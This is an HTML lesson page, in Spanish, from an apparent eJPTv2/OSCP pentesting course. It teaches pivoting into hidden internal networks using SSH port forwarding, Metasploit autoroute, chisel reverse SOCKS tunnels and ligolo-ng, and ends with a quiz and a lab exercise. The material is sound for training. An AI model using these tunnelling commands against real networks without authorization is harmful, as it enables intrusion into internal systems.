@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="es" data-root="../">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>13 · Pivoting · Academia eJPTv2</title>
+<meta name="description" content="Saltar a redes internas: autoroute de Metasploit, proxychains, port forwarding SSH, chisel y ligolo-ng.">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
+<body>
+<div class="layout">
+<aside class="sidebar"></aside>
+<main>
+<span class="badge ejpt">Nivel 1 · eJPTv2</span><span class="badge oscp">Clave en OSCP</span>
+<h1>13 · Pivoting (saltar a redes internas)</h1>
+<p class="lead">Comprometes una máquina que tiene <b>dos tarjetas de red</b>: una da a ti, otra a una red interna que tú no ves. El pivoting usa esa máquina como “puente” para atacar la red oculta.</p>
+
+<h2>1. El concepto</h2>
+<figure>
+<svg viewBox="0 0 820 230" role="img" aria-label="Pivoting a través de un host con dos redes">
+<rect x="20" y="70" width="170" height="90" rx="12" fill="#0f9d6e22" stroke="#0f9d6e"/><text x="105" y="105" text-anchor="middle" font-weight="800">🐉 Kali</text><text x="105" y="130" text-anchor="middle" font-size="12">10.0.2.15</text>
+<rect x="320" y="50" width="180" height="130" rx="12" fill="#d9770622" stroke="#d97706"/><text x="410" y="80" text-anchor="middle" font-weight="800">🖥️ Pivote</text><text x="410" y="105" text-anchor="middle" font-size="12">eth0 10.0.2.20</text><text x="410" y="125" text-anchor="middle" font-size="12">eth1 172.16.5.1</text><text x="410" y="150" text-anchor="middle" font-size="11" class="muted">¡comprometido!</text>
+<rect x="640" y="30" width="160" height="60" rx="10" fill="#dc262622" stroke="#dc2626"/><text x="720" y="65" text-anchor="middle" font-size="13">172.16.5.10</text>
+<rect x="640" y="140" width="160" height="60" rx="10" fill="#dc262622" stroke="#dc2626"/><text x="720" y="175" text-anchor="middle" font-size="13">172.16.5.20</text>
+<text x="720" y="20" text-anchor="middle" font-size="12" class="muted">red interna oculta</text>
+<line x1="190" y1="115" x2="320" y2="115" stroke="#888" stroke-width="3" class="flow"/>
+<line x1="500" y1="90" x2="640" y2="60" stroke="#dc2626" stroke-width="2.5" stroke-dasharray="5 4"/>
+<line x1="500" y1="140" x2="640" y2="170" stroke="#dc2626" stroke-width="2.5" stroke-dasharray="5 4"/>
+</svg>
+<figcaption>Kali no llega a 172.16.5.0/24. Pero el pivote sí. Reenruta tu tráfico a través de él.</figcaption></figure>
+<div class="box analogy"><strong>🧠 Analogía</strong>Estás fuera de un edificio y solo conoces al conserje (pivote). Él sí puede entrar a todas las salas. Le pides que lleve y traiga tus mensajes: tú atacas las salas internas “a través” de él.</div>
+<div class="box def"><strong>📘 Port forwarding vs proxy/túnel</strong><b>Port forwarding</b>: reenvías UN puerto concreto (ej. el 3389 del 172.16.5.10 lo traes a tu 127.0.0.1:3389). <b>Túnel SOCKS</b>: creas un proxy por el que pasa TODO tu tráfico hacia la red interna (con proxychains).</div>
+
+<h2>2. Descubrir que hay otra red</h2>
+<pre><span class="c"># En el pivote comprometido:</span>
+<span class="p">$</span> ip a / ipconfig        <span class="c"># ¿dos interfaces?</span>
+<span class="p">$</span> ip route / route print  <span class="c"># ¿rutas a otras redes?</span>
+<span class="p">$</span> arp -a                  <span class="c"># ¿qué vecinos conoce?</span></pre>
+
+<h2>3. Método A — SSH port forwarding (sin instalar nada)</h2>
+<pre><span class="c"># Local forward: traer el RDP de 172.16.5.10 a mi 127.0.0.1:3389</span>
+<span class="p">$</span> ssh -L 3389:172.16.5.10:3389 user@10.0.2.20
+<span class="c"># Dynamic (proxy SOCKS por el puerto 9050):</span>
+<span class="p">$</span> ssh -D 9050 user@10.0.2.20
+<span class="c"># Luego, con proxychains:</span>
+<span class="p">$</span> proxychains nmap -sT -Pn 172.16.5.10
+<span class="p">$</span> proxychains xfreerdp /v:172.16.5.10</pre>
+<div class="box tip"><strong>💡 proxychains</strong>Edita <code>/etc/proxychains4.conf</code> y pon <code>socks5 127.0.0.1 9050</code> al final. Luego antepón <code>proxychains</code> a cualquier herramienta para que viaje por el túnel.</div>
+
+<h2>4. Método B — Metasploit autoroute</h2>
+<pre><span class="c"># Teniendo una sesión meterpreter en el pivote:</span>
+meterpreter&gt; run autoroute -s 172.16.5.0/24
+meterpreter&gt; background
+msf&gt; use auxiliary/scanner/portscan/tcp
+msf&gt; set RHOSTS 172.16.5.10
+msf&gt; run
+<span class="c"># Proxy SOCKS para usar herramientas de fuera:</span>
+msf&gt; use auxiliary/server/socks_proxy
+msf&gt; run</pre>
+
+<h2>5. Método C — Chisel (el favorito, funciona siempre)</h2>
+<pre><span class="c"># En Kali (servidor):</span>
+<span class="p">$</span> ./chisel server -p 8000 --reverse
+<span class="c"># En el pivote (cliente) — crea un SOCKS inverso:</span>
+<span class="p">$</span> ./chisel client 10.0.2.15:8000 R:socks
+<span class="c"># Ahora en Kali tienes un SOCKS en 127.0.0.1:1080 → proxychains</span></pre>
+
+<h2>6. Método D — Ligolo-ng (moderno, muy cómodo)</h2>
+<pre><span class="c"># Kali: crea interfaz tun y arranca el proxy</span>
+<span class="p">$</span> sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up
+<span class="p">$</span> ./proxy -selfcert
+<span class="c"># Pivote: conecta al agente</span>
+<span class="p">$</span> ./agent -connect 10.0.2.15:11601 -ignore-cert
+<span class="c"># En ligolo: session → start; añade ruta a la red interna</span>
+<span class="p">$</span> sudo ip route add 172.16.5.0/24 dev ligolo
+<span class="c"># ¡Ahora Kali habla con 172.16.5.0/24 como si fuera local, sin proxychains!</span></pre>
+
+<div class="box oscp"><strong>🔴 Nivel OSCP</strong>El escenario de Active Directory del examen suele requerir pivoting: comprometes un host “jump”, y desde ahí llegas al Controlador de Dominio. Ten chisel y ligolo-ng listos (binarios Linux y Windows). Practica montar un doble pivote (red A → red B → red C).</div>
+
+<h2>🎥 Vídeos</h2>
+<div class="vlinks">
+<a href="https://www.youtube.com/results?search_query=pivoting+pentesting+espa%C3%B1ol+chisel" target="_blank" rel="noopener">Pivoting (ES)</a>
+<a href="https://www.youtube.com/results?search_query=ligolo-ng+tutorial" target="_blank" rel="noopener">Ligolo-ng</a>
+<a href="https://www.youtube.com/results?search_query=proxychains+socks+pivoting" target="_blank" rel="noopener">proxychains</a>
+</div>
+
+<h2>📝 Evaluación del tema</h2>
+<script type="application/json" data-quiz="Cuestionario 13 · Pivoting">
+[
+{"q":"¿Qué característica hace a una máquina buena candidata a pivote?","o":["Tener muchos puertos","Tener dos interfaces de red (dos redes)","Ser Windows","Tener Nmap"],"a":1,"e":"Dos interfaces = conecta tu red con una red interna oculta."},
+{"q":"¿Qué herramienta antepones para que tu tráfico pase por un túnel SOCKS?","o":["sudo","proxychains","nmap","ssh"],"a":1,"e":"proxychains <comando>."},
+{"q":"ssh -D 9050 user@pivote crea…","o":["Un local forward","Un proxy SOCKS dinámico","Un bind shell","Un share"],"a":1,"e":"-D = dynamic port forwarding (SOCKS)."},
+{"q":"En Metasploit, ¿qué comando enruta tráfico a la red interna?","o":["run autoroute -s 172.16.5.0/24","set RHOSTS","sessions -i","getsystem"],"a":0,"e":"autoroute añade la ruta por la sesión meterpreter."},
+{"q":"La ventaja de ligolo-ng frente a proxychains es…","o":["Es más viejo","Añade una ruta y usas las herramientas normalmente, sin proxychains","Solo Windows","No necesita pivote"],"a":1,"e":"Crea una interfaz tun; el acceso es transparente."},
+{"q":"Un 'local port forward' sirve para…","o":["Traer un puerto concreto del objetivo a tu 127.0.0.1","Escanear","Crackear","Nada"],"a":0,"e":"ssh -L puerto_local:objetivo:puerto_remoto."}
+]
+</script>
+<div class="lab"><h4>🧪 Práctica</h4><p>Monta un laboratorio de 2 redes (Kali ↔ pivote con 2 NIC ↔ víctima interna). Practica llegar a la víctima interna con los 3 métodos: SSH -D + proxychains, chisel y ligolo-ng. TryHackMe "Wreath" es una sala perfecta para esto.</p></div>
+
+</main>
+<nav class="toc"></nav>
+</div>
+<script src="../assets/app.js"></script>
+</body>
+</html>
